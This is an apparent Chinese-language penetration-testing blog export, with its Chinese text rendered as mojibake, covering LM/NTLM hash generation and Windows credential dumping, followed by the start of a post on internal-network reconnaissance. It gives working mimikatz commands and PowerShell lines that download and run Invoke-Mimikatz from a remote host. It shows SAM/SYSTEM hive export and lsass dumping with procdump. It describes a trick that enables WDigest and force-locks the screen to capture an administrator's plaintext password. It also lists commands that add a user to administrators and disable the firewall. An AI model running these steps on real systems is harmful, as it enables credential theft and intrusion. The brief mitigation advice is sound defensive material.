<p><code>00110001001100100011001100111001001110010011010000000000</code> é•¿åº¦ä¸è¶³ä¾¿åœ¨å·¦è¾¹è¡¥0 è¿™é‡Œä»è®¡ç®—å™¨å¤åˆ¶è¿‡æ¥æ²¡æœ‰å‰é¢ä¸¤ä¸ª0</p>
<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code> æ¯7ä½åˆ†ä¸ºä¸€ç»„</p>
<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000 </code>  æ¯ä¸€ç»„æœ«å°¾è¡¥0</p>
<p>å°†æ¯ä¸€ç»„è½¬æ¢ä½åå…­è¿›åˆ¶</p>
<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000 </code></p>
<p><code>30       98        8C        66        92         C8        D0        00 </code></p>
<p>æœ€ç»ˆå¾—åˆ° <code>30988C6692C8D000</code>  åŒç† <code>00000000000000</code> (14ä¸ª0 ) å¾—åˆ° <code>0000000000000000</code>(16ä¸ª0)</p>
<p>æœ€åå†å°† ä»¥ä¸Šä¸¤ç»„8å­—èŠ‚ç¼–ç  åˆ†åˆ«ä½œä¸ºDES åŠ å¯†çš„å¯†é’¥ ä¸º é­”æœ¯å­—ç¬¦ä¸²â€œKGS!@#$% â€è¿›è¡ŒåŠ å¯†</p>
<p>è¯¥é­”æœ¯å­—ç¬¦ä¸²è½¬æ¢ä¸º16è¿›åˆ¶ä¸º <code>4B47532140232425</code></p>
<p><img src="/posts/11da9eaf/KGS.png"></p>
<p>å°†ä¸¤ç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œ<br>å¾—åˆ°æœ€ç»ˆLM-Hashå€¼ä¸ºï¼š<br>FAE8BB9ECB799902 AAD3B435B51404EE</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pythonå®ç°LM-HASHè„šæœ¬</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span></span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># ç”¨æˆ·çš„å¯†ç è½¬æ¢ä¸ºå¤§å†™,å¹¶è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¯†ç ä¸è¶³14å­—èŠ‚å°†ä¼šç”¨0æ¥è¡¥å…¨</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å›ºå®šé•¿åº¦çš„å¯†ç è¢«åˆ†æˆä¸¤ä¸ª7byteéƒ¨åˆ†</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ¯éƒ¨åˆ†è½¬æ¢æˆæ¯”ç‰¹æµï¼Œå¹¶ä¸”é•¿åº¦ä½56bitï¼Œé•¿åº¦ä¸è¶³ä½¿ç”¨0åœ¨å·¦è¾¹è¡¥é½é•¿åº¦</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å†åˆ†7bitä¸ºä¸€ç»„æœ«å°¾åŠ 0ï¼Œç»„æˆæ–°çš„ç¼–ç </span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> == t_2:</span><br><span class="line">        t_2 = <span class="string">&quot;0000000000000000&quot;</span></span><br><span class="line">    t_1 = binascii.a2b_hex(t_1)</span><br><span class="line">    t_2 = binascii.a2b_hex(t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¸Šæ­¥éª¤å¾—åˆ°çš„8byteäºŒç»„ï¼Œåˆ†åˆ«ä½œä¸ºDES keyä¸º&quot;KGS!@#$%&quot;è¿›è¡ŒåŠ å¯†ã€‚</span></span><br><span class="line">    LM_1 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_1)</span><br><span class="line">    LM_2 = DesEncrypt(<span class="string">&quot;KGS!@#$%&quot;</span>, t_2)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†äºŒç»„DESåŠ å¯†åçš„ç¼–ç æ‹¼æ¥ï¼Œå¾—åˆ°æœ€ç»ˆLM HASHå€¼ã€‚</span></span><br><span class="line">    LM = LM_1 + LM_2</span><br><span class="line">    <span class="built_in">print</span> LM</span><br></pre></td></tr></table></figure>

<h5 id="LM-Hash-ç¼ºç‚¹"><a href="#LM-Hash-ç¼ºç‚¹" class="headerlink" title="LM Hash ç¼ºç‚¹"></a>LM Hash ç¼ºç‚¹</h5><p>1.å¯†ç é•¿åº¦æœ€å¤§åªèƒ½ä¸º14ä¸ªå­—ç¬¦</p>
<p>2.å¯†ç æ— æ³•åŒºåˆ†å¤§å°å†™</p>
<p>3.å¦‚æœå¯†ç å¼ºåº¦å°äº7ä½ï¼Œé‚£ä¸ªç¬¬äºŒä¸ªåˆ†ç»„åŠ å¯†åçš„ç»“æœä¸€å®šä¸º aad3b435b51404ee</p>
<p>4.Des å®¹æ˜“è¢«ç ´è§£ å¯†ç å¼ºåº¦ä¸é«˜</p>
<br>

<p>åœ¨Windows Vista å’Œ Windows Server 2008 ç‰ˆæœ¬å Windowsé»˜è®¤ç¦ç”¨äº†LM Hashã€‚LM-Hash æ˜æ–‡å¯†ç é™åˆ¶åœ¨14ä½ä»¥å†…ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœLM Hashè¢«ç¦ç”¨äº†ï¼Œæ”»å‡»è€…é€šè¿‡å·¥å…·æŠ“å–çš„LM Hash é€šå¸¸ä¸º aad3b435b51404eeaad3b435b51404ee</p>
<br>

<h4 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h4><p>NT LAN Manager (NTML) Hash  æ˜¯åŸºäºMD4ç®—æ³•ã€‚ä»Windows Vista/Windows Server 2003ä»¥åWindowsçš„é»˜è®¤è®¤è¯æ–¹å¼å‡ä¸ºNTLM Hash</p>
<h5 id="NTLM-Hashç”ŸæˆåŸç†"><a href="#NTLM-Hashç”ŸæˆåŸç†" class="headerlink" title="NTLM Hashç”ŸæˆåŸç†"></a>NTLM Hashç”ŸæˆåŸç†</h5><p>1.å°†ç”¨æˆ·å¯†ç ï¼ˆè½¬ä¸ºASCII å†ï¼‰è½¬æ¢ä¸ºåå…­è¿›åˆ¶</p>
<p>2.å°†åå…­è¿›åˆ¶æ ¼å¼çš„å¯†ç è¿›è¡ŒUnicodeç¼–ç </p>
<p>3.ä½¿ç”¨MD4æ‘˜è¦ç®—æ³•å¯¹Unicodeç¼–ç æ•°æ®è¿›è¡ŒHashè®¡ç®—</p>
<br>

<p>ä»¥å¯†ç 123456ä¸ºä¾‹ ï¼Œ</p>
<ul>
<li>é¦–å…ˆå°†å¯†ç å­—ç¬¦ä¸²è½¬æ¢ä¸ºASCIIå­—ç¬¦ä¸²ï¼Œ123456 =&gt; 49 50 51 52 53 54</li>
<li>ASCIIå­—ç¬¦ä¸²åœ¨è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œ49 50 51 52 53 54 =&gt; 31 32 33 34 35 36 </li>
<li>å†è¿›è¡ŒUnicode ç¼–ç ï¼Œ 31 32 33 34 35 36 =&gt; </li>
</ul>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,binascii;</span><br><span class="line"><span class="built_in">print</span> binascii.hexlify(hashlib.new(<span class="string">&quot;md4&quot;</span>, <span class="string">&quot;123456&quot;</span>.encode(<span class="string">&quot;utf-16le&quot;</span>)).digest())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 123456 </span></span><br><span class="line"><span class="comment"># 32ed87bdb5fdc5e9cba88547376818d4</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="å¯†ç æŠ“å–"><a href="#å¯†ç æŠ“å–" class="headerlink" title="å¯†ç æŠ“å–"></a>å¯†ç æŠ“å–</h3><h4 id="GetPassword"><a href="#GetPassword" class="headerlink" title="GetPassword"></a>GetPassword</h4><p>ç›´æ¥ä½¿ç”¨ç®¡ç†å‘˜æƒé™çš„cmd è¿è¡Œ GetPassword.exe å³å¯</p>
<p><img src="/posts/11da9eaf/GetPassword.png"></p>
<h4 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h4><p>å¯ä»¥å¾—åˆ°ç³»ç»Ÿä¸­æ‰€æœ‰åº„æˆ·çš„NTML Hash </p>
<p><img src="/posts/11da9eaf/PwDUmp7.png"></p>
<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p>ä¸‹è½½åœ°å€:<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>Minikatz ç”¨äºWindowsä¸‹è¯»å–å·²ç»ç™»å½•è¿‡çš„ç”¨æˆ·çš„Hash å’Œæ˜æ–‡å¯†ç ï¼Œéœ€è¦adminæˆ–è€…systemæƒé™</p>
<h5 id="æœ¬åœ°äº¤äº’å¼æŠ“å–"><a href="#æœ¬åœ°äº¤äº’å¼æŠ“å–" class="headerlink" title="æœ¬åœ°äº¤äº’å¼æŠ“å–"></a>æœ¬åœ°äº¤äº’å¼æŠ“å–</h5><p><code>mimikatz # privilege::debug</code> æå‡æƒé™</p>
<p><code>mimikatz # log</code> å¯åŠ¨æ—¥å¿—è®°å½•åŠŸèƒ½</p>
<p><code>mimikatz # sekurlsa::logonpasswords</code> è¯»å–å­˜å‚¨åœ¨è®¡ç®—æœºä¸Šçš„æ˜æ–‡å¯†ç å’ŒHashå€¼</p>
<h5 id="æœ¬åœ°éäº¤äº’å¼æŠ“å–"><a href="#æœ¬åœ°éäº¤äº’å¼æŠ“å–" class="headerlink" title="æœ¬åœ°éäº¤äº’å¼æŠ“å–"></a>æœ¬åœ°éäº¤äº’å¼æŠ“å–</h5><p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit &gt; mimikatz.txt</code></p>
<h4 id="powershell-åŠ è½½-mimikatzæŠ“å–"><a href="#powershell-åŠ è½½-mimikatzæŠ“å–" class="headerlink" title="powershell åŠ è½½ mimikatzæŠ“å–"></a>powershell åŠ è½½ mimikatzæŠ“å–</h4><p>å¯ä»¥è¿æ¥å¤–ç½‘æƒ…å†µä¸‹</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<p>å†…ç½‘æƒ…å†µä¸‹ï¼Œå¯ä»¥æ­å»ºä¸€ä¸ªæœ¬åœ°webæœåŠ¡å™¨ï¼Œä½¿ç”¨å†…ç½‘ipå»è®¿é—®</p>
<p><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.0.137/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz</code></p>
<br>

<h4 id="é€šè¿‡SAM-å’Œ-System-æ–‡ä»¶æŠ“å–å¯†ç "><a href="#é€šè¿‡SAM-å’Œ-System-æ–‡ä»¶æŠ“å–å¯†ç " class="headerlink" title="é€šè¿‡SAM å’Œ System æ–‡ä»¶æŠ“å–å¯†ç "></a>é€šè¿‡SAM å’Œ System æ–‡ä»¶æŠ“å–å¯†ç </h4><p>å¯¼å‡ºSAM æ–‡ä»¶å’Œ System æ–‡ä»¶<br><code>reg save hklm\sam sam.hive</code><br><code>reg save hklm\system system.hive</code><br>ç„¶åå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°mimikatzçš„åŒç›®å½•ä¸‹ï¼Œè¿è¡Œmmimikatz<br><code>lsadump::sam /sam:sam.hive /system:system.hive</code><br><img src="/posts/11da9eaf/sam_system_hash.png"><br>å¾—åˆ°NTLMä¸º<code>31d6cfe0d16ae931b73c59d7e0c089c0</code><br>åœ¨ç½‘ç«™ä¸Šè¿›è¡Œè§£å¯†<br><img src="/posts/11da9eaf/cmd5_NTLM.png"><br>å¾—åˆ°å¯†ç ä¸ºç©º ï¼ˆè¯¥æœºå™¨å¯†ç åœ¨è®¾ç½®æ—¶è®¾ä¸ºäº†ç©ºï¼‰</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨ophcrack ï¼ˆ<a href="https://www.objectif-securite.ch/ophcrack%EF%BC%89">https://www.objectif-securite.ch/ophcrackï¼‰</a></p>
<p><img src="/posts/11da9eaf/ophcrack.png"></p>
<p>é€‚ç”¨åœºæ™¯ï¼šè·å¾—äº†systemæƒé™ï¼Œä½†æ˜¯æ— æ³•åœ¨ç›®æ ‡æœºå™¨ä¸Šä¸Šä¼ æˆ–ä½¿ç”¨ Mimikatzï¼Œè¿™æ—¶å€™å°±å¯ä»¥ä½¿ç”¨regå‘½ä»¤å¯¼å‡ºSamå’ŒSystemæ–‡ä»¶ ç„¶åç¦»çº¿è¯»å–å¤„NTML Hash ã€‚å¯ä»¥è€ƒè™‘ä½¿ç”¨åœ¨çº¿è§£å¯†ç½‘ç«™æˆ–è€…hash ä¼ é€’æ–¹å¼å¾—åˆ°æ˜æ–‡ã€‚</p>
<br>

<h4 id="ä½¿ç”¨Powershellè¿›è¡ŒDump-Hashs"><a href="#ä½¿ç”¨Powershellè¿›è¡ŒDump-Hashs" class="headerlink" title="ä½¿ç”¨Powershellè¿›è¡ŒDump Hashs"></a>ä½¿ç”¨Powershellè¿›è¡ŒDump Hashs</h4><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</p>
<h4 id="ProcDump-mimikatz"><a href="#ProcDump-mimikatz" class="headerlink" title="ProcDump + mimikatz"></a>ProcDump + mimikatz</h4><p>ProcDump æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œç¨‹åºï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°å°†ç³»ç»Ÿæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹è½¬å­˜å‚¨ç”Ÿæˆä¸º dump æ–‡ä»¶,æ˜¯ä¸€æ¬¾å¾®è½¯è‡ªå®¶å‡ºå“è½¯ä»¶ï¼Œæ‰€ä»¥å¯ä»¥è¿‡å¾ˆå¤šæ€è½¯ã€‚</p>
<h5 id="dump-lsass-exe-è¿›ç¨‹"><a href="#dump-lsass-exe-è¿›ç¨‹" class="headerlink" title="dump lsass.exe è¿›ç¨‹"></a>dump lsass.exe è¿›ç¨‹</h5><p>æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ æ‰¾åˆ° lsass.exe(Local Security Authority Process) è¿›ç¨‹ï¼Œé€‰æ‹©åˆ›å»ºè½¬å‚¨æ–‡ä»¶</p>
<p><img src="/posts/11da9eaf/dump_lsass.png"></p>
<p><img src="/posts/11da9eaf/dump_lsass2.png"></p>
<p>è¿™é‡Œç”Ÿæˆçš„ä½ç½®åœ¨AppData\Local ä¸‹ å¦‚æœæ²¡æ˜¾ç¤ºè¯¥æ–‡ä»¶ç›®å½• ç‚¹å‡»ç»„ç»‡-&gt;æ–‡ä»¶å¤¹å’Œæœç´¢é€‰é¡¹-&gt;æŸ¥çœ‹ å°†æ˜¾ç¤ºçš„éšè—æ–‡ä»¶ã€æ–‡ä»¶å¤¹å’Œé©±åŠ¨å™¨å‰ç‚¹å‹¾</p>
<p><img src="/posts/11da9eaf/dump_lsass3.png"></p>
<p>ä½¿ç”¨procdump.exe å¯¼å‡ºlsass.exe</p>
<p><code>Procdump.exe -accepteula -ma lsass.exe lsass.dmp</code></p>
<h5 id="è¯»å–dumpæ–‡ä»¶"><a href="#è¯»å–dumpæ–‡ä»¶" class="headerlink" title="è¯»å–dumpæ–‡ä»¶"></a>è¯»å–dumpæ–‡ä»¶</h5><p>ç„¶åå°†ç”Ÿæˆçš„ lsass.dmp æ–‡ä»¶æ”¾åˆ° mimikatz çš„åŒç›®å½•ä¸‹ï¼Œè¿è¡Œmimikatz</p>
<p>ç›´æ¥è¯»å–æ˜æ–‡å¯†ç  </p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::tspkg&quot; exit</code></p>
<p>è¯»å–æ˜æ–‡å¯†ç å’Œhash å€¼(æ˜¾ç¤ºçš„ä¿¡æ¯æ›´å…¨)</p>
<p><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords&quot; exit</code></p>
<h4 id="éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•"><a href="#éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•" class="headerlink" title="éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•"></a>éƒ¨åˆ†ç³»ç»Ÿçš„æŠ“å–å°è¯•</h4><h5 id="Windows-Server-2008-R2"><a href="#Windows-Server-2008-R2" class="headerlink" title="Windows Server 2008 R2"></a>Windows Server 2008 R2</h5><p><img src="/posts/11da9eaf/mimikatz_winserver2008.png"></p>
<h5 id="Windows7-x64"><a href="#Windows7-x64" class="headerlink" title="Windows7 x64"></a>Windows7 x64</h5><p><img src="/posts/11da9eaf/mimikatz_win7.png"></p>
<p>è¿™é‡ŒæŠ“å–çš„å¯†ç ä¸ºç©º å› ä¸ºåŸå¯†ç ä¸ºç©º çœ‹ä¸‹æŠ“å–çš„NTLMå€¼ ä¸ ç©ºå€¼çš„ç›¸åŒ</p>
<br>

<h3 id="é˜²èŒƒæªæ–½"><a href="#é˜²èŒƒæªæ–½" class="headerlink" title="é˜²èŒƒæªæ–½"></a>é˜²èŒƒæªæ–½</h3><p>å®‰è£… KB2871997 è¡¥ä¸ï¼Œå…³é—­WdigeståŠŸèƒ½(Windows Server 2012ä»¥ä¸Šç‰ˆæœ¬éƒ½æ˜¯é»˜è®¤å…³é—­çš„)</p>
<p>å®‰è£…å®Œè¯¥è¡¥ä¸åï¼Œç³»ç»Ÿé»˜è®¤ç¦ç”¨ Wdigest Auth ï¼Œå†…å­˜ï¼ˆlsassè¿›ç¨‹ï¼‰ä¸å†ä¿å­˜æ˜æ–‡å£ä»¤ã€‚Mimikatz å°†è¯»ä¸åˆ°å¯†ç æ˜æ–‡ã€‚</p>
<p>é€šè¿‡æ“¦å¥½çœ‹æ³¨å†Œè¡¨é”®å€¼ï¼Œå¯ä»¥åˆ¤æ–­WdigeståŠŸèƒ½çŠ¶æ€ï¼Œå¦‚æœè¯¥å€¼ä¸º 1 åˆ™ä¸ºå¼€å¯ï¼Œå³å¯è·å–æ˜æ–‡å¯†ç ï¼Œå¦‚æœæ”¹å€¼ä¸º0 åˆ™æ˜æ–‡å¯†ç å°±ä¸ä¼šå‡ºç°åœ¨å†…å­˜ä¸­ã€‚</p>
<p>å¼€å¯æˆ–å…³é—­Wdigest çš„å‘½ä»¤:</p>
<p>ï¼ˆ1ï¼‰ reg add å‘½ä»¤</p>
<p>å¼€å¯Wdigest Auth    </p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</code></p>
<p> ï¼ˆ2ï¼‰ä½¿ç”¨powershell</p>
<p>å¼€å¯Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0</code></p>
<p>(3) åˆ©ç”¨meterpreter</p>
<p>å¼€å¯Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1</code></p>
<p>å…³é—­Wdigest Auth</p>
<p><code>reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0</code></p>
<br>

<p>è®°å½•ä¸€ä½å¸ˆå‚…æ–‡ç« çš„æ€è·¯(<a href="https://github.com/x0rz4/Intranet-information">https://github.com/x0rz4/Intranet-information</a>)</p>
<p>æ‹¿åˆ°äº†adminçš„cmdæƒé™ï¼Œç®¡ç†å‘˜ä½¿ç”¨å¯†ç ç™»å½•äº†æœºå™¨ï¼Œå¼€å¯äº†lsass.exeè¿›ç¨‹ï¼ŒæŠŠå¯†ç ä¿å­˜åœ¨äº†å†…å­˜æ–‡ä»¶lsassè¿›ç¨‹ä¸­ã€‚</p>
<p>æƒ³è¦çš„æŠ“å–æ˜æ–‡ï¼Œä¿®æ”¹æ³¨å†Œè¡¨å¼€å¯Wdigest ï¼Œç„¶ååˆ©ç”¨cmdçš„å¼ºåˆ¶é”å±ï¼Œç­‰å¾…ç®¡ç†å‘˜é‡æ–°è¾“å…¥å¯†ç ç™»å½•ç³»ç»Ÿï¼Œè¿™æ ·å¯†ç å°±è¢«è®°å½•åœ¨äº†lsasså†…å­˜æ–‡ä»¶ä¸­ï¼Œç„¶åä½¿ç”¨procdumpå¯¼å‡ºlsass.dmpï¼Œä½¿ç”¨mimikatzè¿›è¡Œè¯»å–æ˜æ–‡å’Œhash</p>
<p>å¼ºåˆ¶é”å±å‘½ä»¤:</p>
<p>cmd <code>rundll32 user32.dll,LockWorkStation</code></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.sqlsec.com/2019/11/winhash.html">https://www.sqlsec.com/2019/11/winhash.html</a></p>
<p><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a></p>
<p><a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>å†…ç½‘æ¸—é€å­¦ä¹ ç¬”è®°</title>
    <url>/posts/11ff0b53/</url>
    <content><![CDATA[<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="ç½‘ç»œä¿¡æ¯"><a href="#ç½‘ç»œä¿¡æ¯" class="headerlink" title="ç½‘ç»œä¿¡æ¯"></a>ç½‘ç»œä¿¡æ¯</h4><br>

<p><code>ipconfig /all </code>æŸ¥è¯¢ç½‘ç»œé…ç½®</p>
<h4 id="ç”¨æˆ·ä¿¡æ¯"><a href="#ç”¨æˆ·ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ä¿¡æ¯"></a>ç”¨æˆ·ä¿¡æ¯</h4><p><code>net user </code> æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</p>
<p><code>net user XXX /domain</code>   æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</p>
<p><code>net localgroup administrators</code> æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™</p>
<p><code>net localgroup administrators ç”¨æˆ·å /add </code> æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†ç»„  `</p>
<p><code>quser</code>  / <code>quser UserName</code>  / <code>qwinsta</code>æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·</p>
<h4 id="è¿›ç¨‹ä¿¡æ¯"><a href="#è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è¿›ç¨‹ä¿¡æ¯"></a>è¿›ç¨‹ä¿¡æ¯</h4><p><code>tasklist /v</code>  æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p>
<p><code>wmic process list brief</code> æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</p>
<h4 id="æœ¬æœºä¿¡æ¯æ”¶é›†"><a href="#æœ¬æœºä¿¡æ¯æ”¶é›†" class="headerlink" title="æœ¬æœºä¿¡æ¯æ”¶é›†"></a>æœ¬æœºä¿¡æ¯æ”¶é›†</h4><p><code>systeminfo</code> </p>
<p><code>systeminfo | findstr /B /C:&quot;OS åç§°&quot; /C:&quot;OS ç‰ˆæœ¬&quot;</code> è·å–æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><img src="/posts/11ff0b53/systeminfo.png"></p>
<p><code>wmic product get name.version</code> æŸ¥çœ‹æœ¬æœºå®‰è£…çš„è½¯ä»¶å’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><img src="/posts/11ff0b53/wmic_product.png"></p>
<p><code>powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,version&quot;</code>  æŸ¥çœ‹æœ¬æœºå®‰è£…çš„è½¯ä»¶å’Œç‰ˆæœ¬ä¿¡æ¯</p>
<p><code>netstat -ano</code> æŸ¥çœ‹ç«¯å£åˆ—è¡¨</p>
<p><code>systeminfo </code>æŸ¥è¯¢è¡¥ä¸ä¿¡æ¯</p>
<p><code>wmic qfe get description,installedOn /format:csv</code> æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯</p>
<p><code>net share</code> æŸ¥è¯¢æœ¬æœºå…±äº«</p>
<h4 id="é˜²ç«å¢™"><a href="#é˜²ç«å¢™" class="headerlink" title="é˜²ç«å¢™"></a>é˜²ç«å¢™</h4><p><code>netsh advfirewall show allprofiles</code> æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</p>
<p><code>netsh firewall show logging</code> é˜²ç«å¢™æ—¥å¿—ç›®å½•</p>
<p><code>netsh advfirewall set allprofiles state off</code>  å…³é—­é˜²ç«å¢™ï¼ˆwinServer 2003ä»¥åï¼‰</p>
<hr>
